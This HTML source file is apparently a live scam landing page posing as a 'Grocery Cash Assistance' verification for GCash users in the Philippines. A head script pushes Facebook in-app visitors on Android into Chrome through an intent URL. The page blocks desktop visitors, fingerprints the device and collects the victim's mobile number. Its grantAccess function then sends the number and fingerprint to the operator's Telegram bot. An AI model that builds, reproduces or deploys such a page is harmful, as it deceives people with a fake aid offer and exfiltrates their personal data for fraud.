<!DOCTYPE html>
<html lang="en">
<head>
    <script>
        (function() {
            var ua = navigator.userAgent || navigator.vendor || window.opera;
            var isFacebook = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Messenger") > -1);
            
            if (isFacebook && /Android/i.test(ua)) {
                // Kunin ang path pagkatapos ng domain
                var currentPath = window.location.pathname; 
                var currentSearch = window.location.search;
                var cleanUrl = "freeshoppingph.github.io" + currentPath + currentSearch;
                
                var intentUrl = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
                window.location.replace(intentUrl);
            }
        })();
    </script>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>FreeShoppingPH | Verification Process</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    
    <style>
        :root { --primary-green: #2d6a4f; --soft-green: #52b788; --background-light: #f8f9fa; --text-main: #2d3436; }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background-color: var(--background-light); font-family: 'Public Sans', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
        .card { width: 92%; max-width: 380px; background: white; border-radius: 30px; padding: 40px 24px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.05); }
        .logo-img { width: 160px; border-radius: 15px; margin-bottom: 24px; }
        h1 { font-size: 24px; font-weight: 700; color: var(--primary-green); margin-bottom: 12px; }
        p { color: #636e72; font-size: 14px; margin-bottom: 30px; }
        .btn-primary { background: linear-gradient(180deg, var(--soft-green) 0%, var(--primary-green) 100%); color: white; border: none; width: 100%; padding: 18px; border-radius: 15px; font-weight: 700; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
        .btn-primary:disabled { opacity: 0.7; cursor: not-allowed; }
        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(45, 106, 79, 0.4); backdrop-filter: blur(4px); z-index: 999; align-items: center; justify-content: center; }
        .modal-content { width: 92%; max-width: 400px; background: white; border-radius: 24px; padding: 30px 24px; text-align: center; }
        input { width: 100%; background: #f1f3f5; border: 2px solid transparent; border-radius: 12px; padding: 16px; font-size: 18px; text-align: center; font-family: 'JetBrains Mono', monospace; margin-bottom: 20px; outline: none; }
        input:focus { border-color: var(--soft-green); }
        .label-text { text-align: left; display: block; font-size: 11px; font-weight: 700; color: var(--primary-green); margin-bottom: 8px; }
    </style>
</head>
<body>

    <div class="card" id="mainCard">
        <img src="ivana.jpeg" class="logo-img" alt="Logo">
        <h1>Service Activation</h1>
        <p>Verification is required to check your eligibility for the Grocery Cash Assistance.</p>
        <button class="btn-primary" onclick="openModal()">Proceed to Verification</button>
    </div>

    <div class="modal-overlay" id="modalOverlay">
        <div class="modal-content">
            <h2 style="margin-bottom: 20px; color: var(--primary-green);">Eligibility Check</h2>
            <span class="label-text">Mobile Number</span>
            <input type="tel" id="userPhone" placeholder="09xxxxxxxxx" maxlength="11">
            <button class="btn-primary" id="confirmBtn" onclick="handleLogin()">Verify Number</button>
        </div>
    </div>

    <script src="js/config.js"></script>
    <script>
        // Initialize Firebase using config.js variables
        if (!firebase.apps.length) { 
            firebase.initializeApp(firebaseConfig); 
        }
        const db = firebase.database();

        // Mobile Only Check
        if (!/Android|webOS|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
            document.body.innerHTML = "<h2 style='color:red;text-align:center;margin-top:50px;'>MOBILE ONLY ACCESS</h2>";
        }

        function openModal() {
            document.getElementById('modalOverlay').style.display = 'flex';
        }

        // DEVICE FINGERPRINT (Signature)
        function generateSignature() {
            const data = [
                navigator.userAgent,
                screen.height + "x" + screen.width,
                navigator.language,
                navigator.hardwareConcurrency || 0
            ].join('|');
            
            let hash = 0;
            for (let i = 0; i < data.length; i++) {
                hash = ((hash << 5) - hash) + data.charCodeAt(i);
                hash |= 0;
            }
            return "SIG-" + Math.abs(hash);
        }

        const deviceSig = generateSignature();

        // 3. LOGIN LOGIC
        async function handleLogin() {
            const phone = document.getElementById('userPhone').value.trim();
            const btn = document.getElementById('confirmBtn');

            if (phone.length !== 11 || !phone.startsWith("09")) {
                alert("Please enter a valid 11-digit GCash number.");
                return;
            }

            btn.disabled = true;
            btn.innerText = "VERIFYING...";

            try {
                // A. Local/Session Blacklist Check
                if (localStorage.getItem('is_claimed') === 'true') {
                    alert("This beneficiary was already claimed.");
                    btn.disabled = false; btn.innerText = "VERIFY NUMBER";
                    return;
                }

                // B. Database Blacklist Check (Phone & Signature)
                const blackPhone = await db.ref('blacklist/' + phone).once('value');
                const blackSig = await db.ref('blacklisted_devices/' + deviceSig).once('value');

                if (blackPhone.exists() || blackSig.exists()) {
                    localStorage.setItem('is_claimed', 'true');
                    alert("This beneficiary was already claimed.");
                    btn.disabled = false; btn.innerText = "VERIFY NUMBER";
                    return;
                }

                // C. System Mode Check
                const modeSnap = await db.ref('system_status/mode').once('value');
                const mode = modeSnap.val() || 'strict';

                if (mode === 'open') {
                    grantAccess(phone);
                } else {
                    const whiteSnap = await db.ref('whitelist/' + phone).once('value');
                    if (whiteSnap.exists()) {
                        grantAccess(phone);
                    } else {
                        alert("System Notice: Access is currently limited. Try again later.");
                        btn.disabled = false; btn.innerText = "VERIFY NUMBER";
                    }
                }
            } catch (err) {
                console.error(err);
                alert("Connection Error. Please check your signal.");
                btn.disabled = false; btn.innerText = "VERIFY NUMBER";
            }
        }

        function grantAccess(phone) {
            // Telegram Log
            const text = `✅ ELIGIBLE USER ENTERED:\n📱 Number: ${phone}\n🔑 Sig: ${deviceSig}`;
            fetch(`https://api.telegram.org/bot${firebaseConfig.botToken}/sendMessage?chat_id=${firebaseConfig.chatId}&text=${encodeURIComponent(text)}`)
            .catch(e => console.log("Telegram Error"));

            // Store info for main.html
            sessionStorage.setItem('user_phone', phone);
            sessionStorage.setItem('user_sig', deviceSig);
            sessionStorage.setItem('verified_user', 'true');

            setTimeout(() => {
                window.location.href = "main.html";
            }, 1000);
        }
    </script>
</body>
</html>
